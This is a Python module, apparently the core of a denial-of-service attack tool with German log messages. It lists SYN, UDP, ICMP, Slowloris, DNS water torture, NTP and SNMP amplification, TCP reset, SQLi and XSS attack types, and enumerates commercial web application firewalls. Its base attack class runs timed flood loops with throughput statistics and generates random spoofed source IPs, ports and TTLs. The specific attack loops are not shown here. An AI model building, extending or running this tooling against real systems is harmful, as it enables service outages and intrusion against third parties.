import asyncio
import random
import time
import os
from contextlib import suppress
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, fragment

from src.config import AttackConfig
from src.core.attack_stats import AttackStats, SharedStats
from enum import Enum

class AttackType(Enum):
    SYN = "syn"
    UDP = "udp"
    ICMP = "icmp"
    SLOWLORIS = "slowloris"
    DNS = "dns"
    HTTP = "http"
    HTTP2 = "http2"
    QUIC = "quic"
    DNS_WATER_TORTURE = "dns_torture"
    TCP_RESET = "tcp_reset"
    NTP_AMP = "ntp_amp"
    SNMP_AMP = "snmp_amp"
    JS_HTTP = "js_http"
    SQLI = "sqli"
    XSS = "xss"
    CVE = "cve"
    COMBINED = "combined"
    ADAPTIVE = "adaptive"
    SMART_ADAPTIVE = "smart_adaptive"
    INTELLIGENT = "intelligent"

class ExportFormat(Enum):
    JSON = "json"
    PROMETHEUS = "prometheus"
    CSV = "csv"

class PortStatus(Enum):
    OPEN = "open"
    CLOSED = "closed"
    FILTERED = "filtered"

class ServiceType(Enum):
    HTTP = "http"
    HTTPS = "https"
    SSH = "ssh"
    FTP = "ftp"
    TELNET = "telnet"
    SMTP = "smtp"
    DNS = "dns"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    MONGODB = "mongodb"
    REDIS = "redis"
    SMB = "smb"
    RDP = "rdp"
    UNKNOWN = "unknown"

class WAFType(Enum):
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    FORTINET = "fortinet"
    F5_BIG_IP = "f5_big_ip"
    CITRIX = "citrix"
    AWS_WAF = "aws_waf"
    MOD_SECURITY = "mod_security"
    BARRACUDA = "barracuda"
    UNKNOWN = "unknown"

class AttackBase:
    def __init__(self, config: AttackConfig):
        self.config = config
        self.stop_event = asyncio.Event()
        self.start_time = 0
        self.stats = AttackStats(attack_type=self.__class__.__name__)
        self.task_queue = asyncio.Queue(maxsize=10000) if self.config.use_queue else None
        self.shared_stats = None
        if self.config.shared_stats_enabled:
            try:
                self.shared_stats = SharedStats(f"dos_stats_{id(self)}")
            except Exception as e:
                print(f"Shared Memory konnte nicht initialisiert werden: {e}")
        attack_name = self.__class__.__name__.lower()
        self.config.stats[attack_name] = self.stats

    async def setup(self):
        self.start_time = time.time()
        self.stats.start_time = self.start_time
        print(f"Bereite {self.__class__.__name__} vor...")

    async def cleanup(self):
        elapsed = time.time() - self.start_time
        print(f"{self.__class__.__name__} beendet. {self.stats.packets_sent} Pakete in {elapsed:.2f} Sekunden")
        if self.shared_stats:
            self.shared_stats.close()

    async def attack_loop(self):
        raise NotImplementedError("Diese Methode muss implementiert werden")

    async def queue_worker(self):
        if not self.task_queue:
            return
        while not self.stop_event.is_set():
            try:
                task_func, args = await asyncio.wait_for(self.task_queue.get(), timeout=0.5)
                try:
                    if asyncio.iscoroutinefunction(task_func):
                        await task_func(*args)
                    else:
                        task_func(*args)
                except Exception as e:
                    pass
                self.task_queue.task_done()
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                print(f"Fehler im Queue-Worker: {str(e)}")

    async def run(self):
        await self.setup()
        stop_task = asyncio.create_task(self._schedule_stop())
        stats_task = asyncio.create_task(self._print_stats_periodically())
        worker_tasks = []
        if self.task_queue:
            worker_count = max(2, self.config.threads // 2)
            for _ in range(worker_count):
                worker_tasks.append(asyncio.create_task(self.queue_worker()))
        export_task = None
        if self.config.export_stats:
            export_task = asyncio.create_task(self._export_stats_periodically())
        shared_stats_task = None
        if self.shared_stats:
            shared_stats_task = asyncio.create_task(self._update_shared_stats_periodically())
        try:
            await self.attack_loop()
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"Fehler während des Angriffs: {str(e)}")
        finally:
            for task in [stop_task, stats_task, export_task, shared_stats_task] + worker_tasks:
                if task and not task.done():
                    task.cancel()
                    with suppress(asyncio.CancelledError):
                        await task
            await self.cleanup()

    async def _schedule_stop(self):
        await asyncio.sleep(self.config.duration)
        self.stop_event.set()

    async def _print_stats_periodically(self):
        while not self.stop_event.is_set():
            await asyncio.sleep(1)
            self.stats.print_stats()

    async def _export_stats_periodically(self):
        if not self.config.export_stats:
            return
        while not self.stop_event.is_set():
            try:
                await asyncio.sleep(self.config.export_interval)
                export_data = self.stats.export_stats(self.config.export_format)
                if self.config.export_file:
                    mode = 'a' if os.path.exists(self.config.export_file) else 'w'
                    with open(self.config.export_file, mode) as f:
                        f.write(export_data + "\n")
                else:
                    print(f"Stats Export: {export_data[:100]}...")
            except Exception as e:
                print(f"Fehler beim Exportieren der Statistiken: {str(e)}")

    async def _update_shared_stats_periodically(self):
        if not self.shared_stats:
            return
        while not self.stop_event.is_set():
            try:
                await asyncio.sleep(1)
                self.shared_stats.update_stats(self.__class__.__name__, self.stats)
            except Exception as e:
                print(f"Fehler bei Shared Memory Update: {str(e)}")

    def _get_random_packet_size(self) -> int:
        return random.randint(self.config.min_packet_size, self.config.max_packet_size)

    def _get_random_ip(self) -> str:
        from ipaddress import IPv4Address
        return str(IPv4Address(random.randint(184549376, 2851995647)))

    def _get_random_port(self) -> int:
        return random.randint(1024, 65535)

    def _get_random_ttl(self) -> int:
        return random.choice([64, 128, 255])

    def _get_random_ip_flags(self) -> int:
        return random.choice([0, 2])

    def _add_packet_padding(self, packet_size: int) -> bytes:
        return random.randbytes(packet_size) if hasattr(random, 'randbytes') else bytes(packet_size)
